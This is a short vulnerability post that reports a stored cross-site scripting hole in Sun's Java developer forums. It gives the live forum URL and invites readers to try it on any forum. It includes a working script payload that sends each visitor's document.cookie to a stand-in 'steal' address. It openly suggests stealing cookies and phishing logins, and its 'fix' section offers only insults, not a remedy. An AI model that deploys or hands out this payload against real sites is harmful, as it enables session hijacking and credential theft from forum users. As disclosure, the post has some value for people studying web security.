Sun, in their amazing patheticness, have again allowed direct HTML 
to be written into their forum system.

URL: http://forum.java.sun.com/forum.jspa?forumID=553

It works on only select forums, but due to severe incompetence from 
the administrators of the site, this issue will occur quit often. 
It is worth your while to test out any forum you like, you may just 
see it working.


EXPLOIT (hah):
==============
start a new thread or post a reply and include any HTML you like, 
preferrably to steal a cookie or trick users into logging in again 
but submit to your server; your imagination is the only restriction.


EXAMPLE:
==============
Message:
Hello. 
<img id="xxa" />
<script>window.attachEvent("onload", foo);
function foo() {
  xxa.src = "http://www.example.com/steal/?" + document.cookie;
}
</script>


FIX:
==============
Sun needs to accept that their administration of the site is 
absolutely terrible and do something about it. The Jive software 
that runs the forum is completely fine, it is suns mismanagement 
that causes these issues. Jive should not be subject to the very 
bad image the forum software gets from it's use on Sun's site.

Thanks.
